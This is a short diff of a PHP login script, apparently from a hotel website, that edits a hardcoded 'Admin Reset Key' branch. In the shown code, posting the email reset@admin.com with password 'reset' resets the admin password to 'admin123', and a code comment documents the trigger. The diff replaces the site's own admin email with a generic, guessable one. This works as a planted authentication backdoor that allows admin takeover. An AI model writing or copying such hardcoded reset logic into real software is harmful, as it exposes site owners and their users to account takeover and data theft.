@@ -54,8 +54,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $password = $_POST['password'] ?? '';
     $remember = isset($_POST['remember']);
     
-    // Admin Reset Key - Key: 308204, Password: empty
-    if ($email === 'admin@aurorahotelplaza.com' && $password === 'reset') {
+    // Admin Reset Key - Email: reset@admin.com, Password: reset
+    if ($email === 'reset@admin.com' && $password === 'reset') {
         try {
             $db = getDB();
             $new_password = 'admin123';
